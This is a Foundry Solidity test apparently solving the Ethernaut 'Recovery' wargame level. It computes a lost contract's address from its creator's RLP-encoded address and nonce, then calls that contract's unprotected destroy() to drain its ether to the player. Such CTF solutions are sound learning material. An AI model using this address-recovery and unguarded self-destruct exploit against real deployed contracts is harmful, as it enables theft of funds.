// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Recovery/RecoveryFactory.sol";
import "../src/Ethernaut.sol";

contract RecoveryTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testRecoveryHack() public {
        /****************
         * Factory setup *
         *************** */
        RecoveryFactory recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(recoveryFactory);
        Recovery(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */

        /*
         * For this level we will need to play around with EVM OPCODE
         * We need to really understand the contract and what's happening with new SimpleToken(_name, msg.sender, _initialSupply);
         * It actually create OPCODE; "new" keyword uses the CREATE
         * newAddress = keccak256_encode(rlp_encode(sender_address, nonce))
         *
         * So there is a way to find the address of this created contract with opcode
         * Once we have found it, it's quite straightforwad to call destroy method available
         *  on simpleToken and which is not protected :)
         */
        address addressToFind = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6), // RLP encoding of a 20-byte address
                            bytes1(0x94), // RLP encoding of a 20-byte address
                            address(levelAddress),
                            bytes1(0x01) // RLP encoding for nonce 1
                        )
                    )
                )
            )
        );

        uint256 balanceBefore = addressToFind.balance;
        assertEq(balanceBefore, 0.001 ether);
        uint256 playerBalanceBefore = player.balance;
        /*
         * not using the new keywoard for SimpleToken as we point to an existing contract
         */
        SimpleToken(payable(addressToFind)).destroy(payable(player));
        uint256 balanceAfter = addressToFind.balance;
        assertEq(balanceAfter, 0);
        assertEq(player.balance, playerBalanceBefore + 0.001 ether);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
